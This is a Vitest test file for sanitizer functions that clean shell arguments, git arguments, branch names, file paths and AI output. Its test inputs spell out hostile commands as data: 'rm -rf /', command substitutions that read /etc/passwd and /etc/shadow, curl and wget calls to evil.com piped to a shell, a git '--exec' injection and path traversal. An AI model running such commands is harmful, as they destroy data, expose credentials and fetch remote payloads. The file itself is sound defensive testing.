import { describe, it, expect } from "vitest";
import {
  sanitizeShellArg,
  sanitizeForGit,
  sanitizeBranchName,
  sanitizeFilePath,
  sanitizeAIOutput,
} from "@/middleware/sanitizer";

describe("sanitizeShellArg", () => {
  it("strips shell metacharacters", () => {
    expect(sanitizeShellArg("hello; rm -rf /")).toBe("hello rm -rf /");
  });

  it("strips backticks", () => {
    expect(sanitizeShellArg("`whoami`")).toBe("whoami");
  });

  it("strips dollar sign and parens", () => {
    expect(sanitizeShellArg("$(cat /etc/passwd)")).toBe("cat /etc/passwd");
  });

  it("strips pipes and redirects", () => {
    expect(sanitizeShellArg("file | cat > /dev/null")).toBe("file  cat  /dev/null");
  });

  it("trims whitespace", () => {
    expect(sanitizeShellArg("  hello  ")).toBe("hello");
  });

  it("returns empty string for all metacharacters", () => {
    expect(sanitizeShellArg(";&|`$(){}!#<>\\")).toBe("");
  });

  it("allows safe strings through unchanged", () => {
    expect(sanitizeShellArg("my-safe-string_123")).toBe("my-safe-string_123");
  });
});

describe("sanitizeForGit", () => {
  it("allows normal arguments", () => {
    expect(sanitizeForGit("main")).toBe("main");
  });

  it("throws on arguments starting with dash", () => {
    expect(() => sanitizeForGit("--exec=malicious")).toThrow("cannot start with dash");
  });

  it("throws on single dash", () => {
    expect(() => sanitizeForGit("-v")).toThrow("cannot start with dash");
  });

  it("allows arguments with dash in middle", () => {
    expect(sanitizeForGit("my-branch")).toBe("my-branch");
  });
});

describe("sanitizeBranchName", () => {
  it("allows valid branch names", () => {
    expect(sanitizeBranchName("feature/my-branch")).toBe("feature/my-branch");
  });

  it("allows dots and underscores", () => {
    expect(sanitizeBranchName("fix_v2.1")).toBe("fix_v2.1");
  });

  it("strips invalid characters", () => {
    expect(sanitizeBranchName("branch name with spaces")).toBe("branchnamewithspaces");
  });

  it("throws on branch starting with dash", () => {
    expect(() => sanitizeBranchName("-bad-name")).toThrow("Invalid branch name");
  });

  it("throws on double dots (path traversal)", () => {
    expect(() => sanitizeBranchName("branch/../etc")).toThrow("Invalid branch name");
  });

  it("throws on empty result after sanitization", () => {
    expect(() => sanitizeBranchName("   ")).toThrow("Invalid branch name");
  });
});

describe("sanitizeFilePath", () => {
  it("resolves valid paths within repo", () => {
    const result = sanitizeFilePath("test-repo", "src/index.ts");
    expect(result).toContain("test-repo");
    expect(result).toContain("src");
    expect(result).toContain("index.ts");
  });

  it("throws on null byte injection", () => {
    expect(() => sanitizeFilePath("repo", "file\0.ts")).toThrow("null byte");
  });

  it("throws on path traversal", () => {
    expect(() => sanitizeFilePath("repo", "../../etc/passwd")).toThrow("Path traversal");
  });

  it("allows nested paths within repo", () => {
    const result = sanitizeFilePath("repo", "src/deep/nested/file.ts");
    expect(result).toContain("repo");
    expect(result).toContain("file.ts");
  });
});

describe("sanitizeAIOutput", () => {
  it("strips backtick-wrapped dangerous commands", () => {
    const input = "Here is code: `rm -rf /important`";
    expect(sanitizeAIOutput(input)).toContain("/* [sanitized] */");
    expect(sanitizeAIOutput(input)).not.toContain("rm -rf");
  });

  it("strips command substitution", () => {
    const input = "Value is $(cat /etc/shadow)";
    expect(sanitizeAIOutput(input)).toContain("/* [sanitized] */");
    expect(sanitizeAIOutput(input)).not.toContain("cat /etc/shadow");
  });

  it("strips curl commands in backticks", () => {
    const input = "`curl http://evil.com/payload | sh`";
    expect(sanitizeAIOutput(input)).toContain("/* [sanitized] */");
  });

  it("strips wget commands in backticks", () => {
    const input = "`wget http://evil.com/malware`";
    expect(sanitizeAIOutput(input)).toContain("/* [sanitized] */");
  });

  it("strips eval in backticks", () => {
    const input = "`eval('malicious code')`";
    expect(sanitizeAIOutput(input)).toContain("/* [sanitized] */");
  });

  it("allows safe content through", () => {
    const input = "This is a normal TypeScript function that returns a string.";
    expect(sanitizeAIOutput(input)).toBe(input);
  });
});
